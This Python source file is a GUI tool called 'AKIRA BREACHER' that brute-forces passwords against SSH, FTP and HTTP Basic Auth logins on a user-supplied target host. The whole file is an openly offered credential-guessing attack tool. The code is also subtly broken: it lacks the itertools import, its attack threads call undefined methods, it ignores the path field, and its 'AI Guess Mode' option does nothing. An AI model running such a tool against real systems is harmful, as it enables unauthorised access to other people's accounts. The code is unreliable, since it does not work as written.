import tkinter as tk
from tkinter import ttk
import paramiko
import ftplib
import requests
import random
import threading
import string
import time
import webbrowser

class AkiraBreacher:
    def __init__(self, root):
        self.root = root
        self.root.title("AKIRA BREACHER v4.0 - By S2-Akira")
        self.root.geometry("700x600")
        self.root.config(bg="#1e1e1e")
        self.stop_flag = False
        self.dark_mode = True
        self.current_thread = None
        
        # Setup GUI Styles
        self.style = ttk.Style(self.root)
        self.set_theme()

        self.tabs = ttk.Notebook(self.root)
        self.tabs.pack(expand=1, fill="both", padx=10, pady=10)

        # Create the tabs
        self.create_ssh_tab()
        self.create_ftp_tab()
        self.create_http_tab()

        # Dark Mode Button
        self.dark_btn = tk.Button(self.root, text="Toggle Dark Mode", command=self.toggle_theme, bg="#333333", fg="white")
        self.dark_btn.pack(pady=10)

        # GitHub branding
        github_label = tk.Label(self.root, text="Created by S2-Akira | GitHub", fg="cyan", cursor="hand2", font=("Arial", 10, "bold"))
        github_label.pack(pady=5)
        github_label.bind("<Button-1>", lambda e: webbrowser.open_new("https://github.com/S2-Akira"))

    def set_theme(self):
        if self.dark_mode:
            self.root.configure(bg="#2e2e2e")
            self.style.theme_use("clam")
            self.style.configure(".", background="#2e2e2e", foreground="white", fieldbackground="#3a3a3a")
        else:
            self.root.configure(bg="SystemButtonFace")
            self.style.theme_use("default")

    def toggle_theme(self):
        self.dark_mode = not self.dark_mode
        self.set_theme()

    def create_tab_base(self, tab):
        entries = {}
        fields = [
            ("Target Host/IP:", "host"),
            ("Port:", "port"),
            ("Username:", "username"),
            ("Charset:", "charset"),
            ("Max Length:", "maxlen")
        ]
        for i, (label, key) in enumerate(fields):
            tk.Label(tab, text=label, bg="#2e2e2e", fg="white", font=("Arial", 12)).grid(row=i, column=0, sticky="e", padx=10, pady=5)
            entry = tk.Entry(tab, width=35, font=("Arial", 12))
            entry.grid(row=i, column=1, padx=10)
            if key == "port":
                entry.insert(0, "22")
            elif key == "charset":
                entry.insert(0, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()")
            elif key == "maxlen":
                entry.insert(0, "4")
            entries[key] = entry

        ai_mode = tk.BooleanVar()
        ai_check = tk.Checkbutton(tab, text="Enable AI Guess Mode", variable=ai_mode, bg="#2e2e2e", fg="white", font=("Arial", 12))
        ai_check.grid(row=5, column=0, columnspan=2, pady=10)

        output = tk.Text(tab, height=10, width=70, font=("Arial", 12), bg="#2a2a2a", fg="white", insertbackground="white")
        output.grid(row=10, column=0, columnspan=2, padx=10, pady=10)

        return entries, output

    def create_ssh_tab(self):
        tab = ttk.Frame(self.tabs)
        self.tabs.add(tab, text="SSH Brute")
        self.ssh_entries, self.ssh_output = self.create_tab_base(tab)

        tk.Button(tab, text="Start Attack", command=self.start_ssh, bg="green", fg="white", font=("Arial", 14)).grid(row=9, column=0, pady=5)
        tk.Button(tab, text="Stop", command=self.stop_attack, bg="red", fg="white", font=("Arial", 14)).grid(row=9, column=1, pady=5)

    def create_ftp_tab(self):
        tab = ttk.Frame(self.tabs)
        self.tabs.add(tab, text="FTP Brute")
        self.ftp_entries, self.ftp_output = self.create_tab_base(tab)

        tk.Button(tab, text="Start Attack", command=self.start_ftp, bg="green", fg="white", font=("Arial", 14)).grid(row=9, column=0, pady=5)
        tk.Button(tab, text="Stop", command=self.stop_attack, bg="red", fg="white", font=("Arial", 14)).grid(row=9, column=1, pady=5)

    def create_http_tab(self):
        tab = ttk.Frame(self.tabs)
        self.tabs.add(tab, text="HTTP Basic Auth")
        self.http_entries, self.http_output = self.create_tab_base(tab)

        tk.Label(tab, text="Path (e.g. /login):", bg="#2e2e2e", fg="white", font=("Arial", 12)).grid(row=6, column=0, sticky="e", padx=10)
        path_entry = tk.Entry(tab, width=35, font=("Arial", 12))
        path_entry.grid(row=6, column=1, padx=10)
        self.http_entries["path"] = path_entry

        tk.Button(tab, text="Start Attack", command=self.start_http, bg="green", fg="white", font=("Arial", 14)).grid(row=9, column=0, pady=5)
        tk.Button(tab, text="Stop", command=self.stop_attack, bg="red", fg="white", font=("Arial", 14)).grid(row=9, column=1, pady=5)

    def start_ssh(self):
        self.stop_flag = False
        self.current_thread = threading.Thread(target=self.brute_ssh)
        self.current_thread.start()

    def start_ftp(self):
        self.stop_flag = False
        self.current_thread = threading.Thread(target=self.brute_ftp)
        self.current_thread.start()

    def start_http(self):
        self.stop_flag = False
        self.current_thread = threading.Thread(target=self.brute_http)
        self.current_thread.start()

    def stop_attack(self):
        self.stop_flag = True
        if self.current_thread and self.current_thread.is_alive():
            self.current_thread.join()
        self.log(self.ssh_output, "[*] Attack Stopped.")

    def log(self, output, msg):
        output.insert(tk.END, msg + "\n")
        output.see(tk.END)

    def brute_force_loop(self, func, entries, out):
        host = entries["host"].get()
        port = int(entries["port"].get())
        username = entries["username"].get()
        charset = entries["charset"].get()
        maxlen = int(entries["maxlen"].get())
        
        passwords = self.generate_passwords(charset, maxlen)
        
        for pwd in passwords:
            if self.stop_flag:
                self.log(out, "[*] Attack Stopped.")
                return
            self.log(out, f"Trying: {pwd}")
            if func(host, port, username, pwd):
                self.log(out, f"[+] SUCCESS: {pwd}")
                return
        self.log(out, "[-] Attack Complete. No Match Found.")

    def generate_passwords(self, charset, maxlen):
        """Generate all possible passwords based on the charset and max length."""
        passwords = []
        for length in range(1, maxlen + 1):
            passwords.extend(''.join(c) for c in itertools.product(charset, repeat=length))
        return passwords

    def try_ssh(self, host, port, username, password):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username, password=password, timeout=5)
            client.close()
            return True
        except:
            return False

    def try_ftp(self, host, port, username, password):
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login(user=username, passwd=password)
            ftp.quit()
            return True
        except:
            return False

    def try_http(self, host, port, username, password):
        try:
            url = f"http://{host}:{port}/login"
            r = requests.get(url, auth=(username, password), timeout=5)
            return r.status_code == 200
        except:
            return False

if __name__ == "__main__":
    root = tk.Tk()
    app = AkiraBreacher(root)
    root.mainloop()
